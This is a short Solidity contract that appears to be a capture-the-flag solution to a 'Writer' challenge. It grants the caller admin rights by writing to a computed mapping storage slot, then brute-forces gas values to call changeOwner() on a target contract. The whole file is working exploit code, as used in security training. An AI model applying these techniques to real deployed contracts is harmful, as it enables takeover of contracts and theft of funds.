// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Writer.sol";

contract WriterSolution {
    Writer writer;

    constructor(address writerAddress) {
        writer = Writer(writerAddress);
    }

    function becomeAdmin() external {
        uint256 x = uint256(keccak256(abi.encode(0, 3)));
        writer.write(
            uint256(keccak256(abi.encode(address(msg.sender), x))),
            true
        );
    }

    function takeOwnership() external {
        address targetAddress = writer.getWriterTargetInstanceAddress();
        for (uint256 i = 0; i < 300; i++) {
            (bool success, ) = targetAddress.call{gas: i + (7743 * 3)}(
                abi.encodeWithSignature("changeOwner()")
            );
            if (success) {
                break;
            }
        }
    }
}
